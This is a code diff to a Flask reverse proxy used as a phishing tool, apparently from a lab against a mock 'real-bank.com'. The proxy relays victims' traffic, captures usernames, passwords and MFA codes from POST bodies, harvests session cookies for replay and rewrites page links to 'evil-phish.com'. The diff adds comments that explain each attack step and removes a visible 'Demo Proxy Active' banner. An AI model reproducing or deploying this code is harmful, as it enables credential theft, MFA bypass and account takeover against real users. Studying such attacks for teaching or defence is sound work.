@@ -17,16 +17,18 @@ MAX_EVENTS = 100
 
 
 
-def record_event(event_type, ip, path, **details):
+def record_event(event_type, ip, path, **details): #**details is kwarg dict to catch extras
+    #inserts timestamped event + kwargs into captured_events[0] and cleans up past index MAX_EVENTS
+
     event = {
         "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         "type": event_type,
         "ip": ip,
         "path": path,
     }
-    event.update(details)
-    captured_events.insert(0, event)
-    del captured_events[MAX_EVENTS:]
+    event.update(details)               #combine details dict to event dict
+    captured_events.insert(0, event)    #most recent event at top of list
+    del captured_events[MAX_EVENTS:]    #delete events after list fills up 100+
     return event
 
 
@@ -79,9 +81,11 @@ def stolen():
 
 
 
-@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
-@app.route('/<path:path>', methods=['GET', 'POST'])
+@app.route('/', defaults={'path': ''}, methods=['GET', 'POST']) #for problems with root page returning error page
+@app.route('/<path:path>', methods=['GET', 'POST'])             #this catches every route the victim accesses
 def proxy(path):
+
+    #protecting our attacker pages from the victim
     reserved_paths = {'dashboard', 'api/events', 'stolen'}
     if path in reserved_paths:
         return Response('Not found', status=404)
@@ -89,8 +93,8 @@ def proxy(path):
 
     url = f"{REAL_SERVER}/{path}"
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    client_ip = request.remote_addr
-    display_path = f"/{path}" if path else "/"
+    client_ip = request.remote_addr                         #pulls the victim's IP address
+    display_path = f"/{path}" if path else "/"              #makes sure it doesn't break if victim visits root
 
 
     print(f"[{timestamp}] {client_ip} -> {request.method} {display_path}")
@@ -103,46 +107,44 @@ def proxy(path):
         raw_body = request.get_data(as_text=True)
         print(f"    Intercepted POST body: {raw_body}")
 
-
+        #parses query string and returns a dict
         parsed = parse_qs(raw_body)
-        if 'user' in parsed or 'pw' in parsed:
+
+        if 'user' in parsed or 'pw' in parsed:  #capture victim details
             username = parsed.get('user', [''])[0]
             password = parsed.get('pw', [''])[0]
-            record_event('credentials', client_ip, display_path, username=username, password=password)
+            record_event('credentials', client_ip, display_path, username=username, password=password)  #store in list
             print(f"    Captured credentials -> user={username} pw={password}")
-        if 'code' in parsed:
+        if 'code' in parsed:    #capture MFA code details
             code = parsed.get('code', [''])[0]
             record_event('mfa', client_ip, display_path, code=code)
             print(f"    Captured MFA code -> {code}")
 
 
+    #proxy forwards incoming request to 'url', maintaining same method, body, and cookies but removed 'host' header to prevent leaving traces
+    #this is where we impersonate the victim
     resp = requests.request(
-        method=request.method,
-        url=url,
-        data=request.get_data(),
-        headers={k: v for k, v in request.headers if k.lower() != 'host'},
-        cookies=request.cookies,
-        allow_redirects=False,
+        method=request.method,  #match victim request method
+        url=url,    #send victim's login request to real server
+        data=request.get_data(),    #actual data the victim sent to real server
+        headers={k: v for k, v in request.headers if k.lower() != 'host'},  #relays exact same headers except 'host' which is our proxy (we omit this to stay invisible to both ppl)
+        cookies=request.cookies,    #send same cookie info to real server (if logged in, stays logged in basically)
+        allow_redirects=False,      #this sends the user to the actual site if a redirect is sent from the actual site (we relay the redirect to victim)
         timeout=10,
     )
 
-
-    html_content = resp.content.decode('utf-8', errors='ignore')
-    modified_content = html_content.replace("real-bank.com:5000", "evil-phish.com:5001")
-
-
-    if '</body>' in modified_content:
-        modified_content = modified_content.replace(
-            '</body>',
-            "<div style='position:fixed;bottom:10px;right:10px;background:#8b0000;color:white;padding:8px 12px;border-radius:8px;font-family:Arial;'>Demo Proxy Active</div></body>"
-        )
+    #we unpack the response and steal the actual html
+    html_content = resp.content.decode('utf-8', errors='ignore')    #errors kept crashing the app
+    modified_content = html_content.replace("real-bank.com:5000", "evil-phish.com:5001")    #steal the html of the actual site
 
 
-    if 'Set-Cookie' in resp.headers:
+    if 'Set-Cookie' in resp.headers:    #bc http sends back headers, including cookie info
         full_cookie = resp.headers['Set-Cookie']
-        session_value = full_cookie.split(';')[0]
+        session_value = full_cookie.split(';')[0]   #turn header into list and extract index 0 (the sesh id)
+
+        #extract session id and make it an object and add into list
         if session_value.startswith('session_id='):
-            session_id = session_value.split('=', 1)[1]
+            session_id = session_value.split('=', 1)[1] 
             session_record = {
                 'timestamp': timestamp,
                 'path': display_path,
@@ -151,14 +153,9 @@ def proxy(path):
             }
             stolen_sessions.append(session_record)
             record_event('session', client_ip, display_path, session_id=session_id)
-            print("\n" + "!" * 40)
-            print("SUCCESS: STOLEN SESSION COOKIE BELOW")
-            print(full_cookie)
-            print(f"Replay-friendly session_id: {session_id}")
-            print("Open attacker dashboard at: http://127.0.0.1:5001/dashboard")
-            print("!" * 40 + "\n")
 
 
+    #info in headers sent back by the server can mismatch bc it doesn't know the proxy exists so just exclude them
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
     headers = [(name, value) for (name, value) in resp.headers.items()
                if name.lower() not in excluded_headers]
